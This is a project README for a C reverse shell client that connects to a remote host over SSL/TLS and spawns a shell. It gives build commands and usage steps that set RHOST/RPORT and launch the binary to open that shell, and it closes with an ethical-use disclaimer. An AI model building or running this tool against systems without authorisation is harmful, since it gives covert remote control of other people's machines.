# Reverse Shell Client

A simple reverse shell client written in C that connects to a specified remote server over an SSL/TLS connection. 
It can be used for secure remote shell access to a target machine. 

## Features

- **Secure Connection**: Utilizes SSL/TLS for encrypted communication between client and server.
- **Cross-Protocol Support**: Works with both IPv4 and IPv6.
- **Timeout Handling**: Configurable socket timeout to handle connection issues.
- **Signal Handling**: Gracefully exits on interrupt signals.
- **Dynamic Shell Spawning**: Launches a shell on the remote server upon successful connection.

## Prerequisites

- **OpenSSL**: Required for SSL/TLS functionality.
- **GCC**: For compiling the C source code.
- **Make**: Optional, for building with a Makefile.

## Installation

1. **Clone the Repository**:
   ```bash
	git clone git@github.com:Umair-khurshid/Reverse-Shell-Client.git
	cd Reverse-Shell-Client
   ```
   
2. **Install Dependencies (for Ubuntu/Debian)**:

```bash
	sudo apt-get update
	sudo apt-get install libssl-dev gcc make
```

3. **Compile the Program**:
```bash
	gcc -Wall -o RemoteShellClient main.c -lssl -lcrypto
```

## Usage
1. **Set Environment Variables**:

```bash
export RHOST="192.168.1.100"  # Replace with the target IP address or domain
export RPORT="4444"           # Replace with the target port
```
2. **Run the Program**:

```bash
./RemoteShellClient
```


## Troubleshooting
- **Connection Issues**: Ensure the remote server is accessible and listening on the specified port.
- **SSL/TLS Errors**: Verify that OpenSSL is correctly installed and configured on both the client and server.
- **Compilation Errors**: Ensure all dependencies are installed and that you are using the correct version of GCC and OpenSSL.


## Disclaimer
_This tool is intended for educational purposes and ethical use only. Unauthorized use or deployment on networks or systems without explicit permission is illegal and unethical. Always ensure you have proper authorization before using this tool._


